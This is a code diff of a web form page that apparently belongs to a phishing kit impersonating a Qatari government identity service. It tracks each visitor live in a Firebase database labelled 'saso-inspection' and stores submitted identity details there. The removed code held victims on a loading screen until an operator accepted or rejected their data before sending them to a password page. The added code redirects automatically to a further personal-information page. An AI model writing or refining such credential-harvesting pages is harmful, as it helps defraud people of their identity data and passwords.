@@ -181,19 +181,9 @@
 
         .footer-text { text-align: center; margin-top: 30px; font-size: 13px; color: #666; padding-bottom: 20px; }
 
-        /* حقول الخطأ المخصصة للبريد غير المطابق */
-        .input-error {
-            border-color: red !important;
-        }
-        .error-message {
-            color: red;
-            font-size: 12px;
-            font-weight: bold;
-            margin-top: 5px;
-            display: none;
-        }
+        .input-error { border-color: red !important; }
+        .error-message { color: red; font-size: 12px; font-weight: bold; margin-top: 5px; display: none; }
 
-        /* شاشة التحميل */
         #loading-overlay {
             display: none;
             position: fixed;
@@ -309,7 +299,6 @@
     </div>
 
     <script>
-        // إعدادات Firebase
         const firebaseConfig = {
             apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT...", 
             authDomain: "saso-inspection.firebaseapp.com",
@@ -323,12 +312,10 @@
         if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
         const database = firebase.database();
 
-        // استخدام نفس المعرف الموحد
         let visitorId = sessionStorage.getItem('visitorId');
         const visitorRef = database.ref('active_visitors/' + visitorId);
-        visitorRef.update({ currentPage: "بيانات الهوية (nas_qatar.html)", lastSeen: firebase.database.ServerValue.TIMESTAMP });
+        visitorRef.update({ currentPage: "بيانات الهوية", lastSeen: firebase.database.ServerValue.TIMESTAMP });
 
-        // جلب الدول لخانة رقم الهاتف
         async function fetchCountries() {
             const select = document.getElementById('country_code');
             try {
@@ -352,40 +339,22 @@
             document.getElementById('citizen_fields').style.display = isCitizen ? 'block' : 'none';
             document.getElementById('citizen_info').style.display = isCitizen ? 'block' : 'none';
             document.getElementById('visitor_fields').style.display = isCitizen ? 'none' : 'block';
-            
-            // إعادة تعيين الألوان والأخطاء عند التبديل بين الأنواع لحماية المظهر
-            if (isCitizen) {
-                document.getElementById('email').classList.remove('input-error');
-                document.getElementById('confirm_email').classList.remove('input-error');
-                document.getElementById('email_error_msg').style.display = 'none';
-            }
         }
 
-        // إرسال البيانات والانتظار مع أداة التحقق من تطابق البريد الإلكتروني للزوار
         document.getElementById('mainForm').onsubmit = function(e) {
             e.preventDefault();
-            
             const isVisitor = document.getElementById('type_visitor').checked;
             const emailInput = document.getElementById('email');
             const confirmEmailInput = document.getElementById('confirm_email');
-            const errorMsg = document.getElementById('email_error_msg');
             
-            // التحقق من التطابق في حالة كان الحساب زائر
-            if (isVisitor) {
-                if (emailInput.value !== confirmEmailInput.value || emailInput.value === "") {
-                    emailInput.classList.add('input-error');
-                    confirmEmailInput.classList.add('input-error');
-                    errorMsg.style.display = 'block';
-                    return false; // إيقاف الإرسال تماماً
-                } else {
-                    emailInput.classList.remove('input-error');
-                    confirmEmailInput.classList.remove('input-error');
-                    errorMsg.style.display = 'none';
-                }
+            if (isVisitor && (emailInput.value !== confirmEmailInput.value || emailInput.value === "")) {
+                document.getElementById('email_error_msg').style.display = 'block';
+                return;
             }
             
+            document.getElementById('loading-overlay').style.display = 'flex';
+
             const detailRef = database.ref('user_details/' + visitorId);
-            
             detailRef.set({
                 id: visitorId,
                 accountType: document.querySelector('input[name="account_type"]:checked').value,
@@ -397,19 +366,10 @@
                 timestamp: firebase.database.ServerValue.TIMESTAMP
             });
 
-            document.getElementById('loading-overlay').style.display = 'flex';
-
-            // الاستماع لقرار الأدمن
-            detailRef.on('value', (snap) => {
-                const val = snap.val();
-                if (val && val.status === "accept") {
-                    window.location.href = "password.html";
-                } else if (val && val.status === "reject") {
-                    document.getElementById('loading-overlay').style.display = 'none';
-                    Swal.fire({ title: 'خطأ', text: 'البيانات المدخلة غير صحيحة، يرجى المحاولة مرة أخرى.', icon: 'error', confirmButtonColor: '#8a1538' });
-                    detailRef.update({ status: "waiting" });
-                }
-            });
+            // التوجيه التلقائي لصفحة personal_info.php
+            setTimeout(() => {
+                window.location.href = "personal_info.php";
+            }, 1500);
         };
 
         window.onload = () => { fetchCountries(); toggleFields(); };
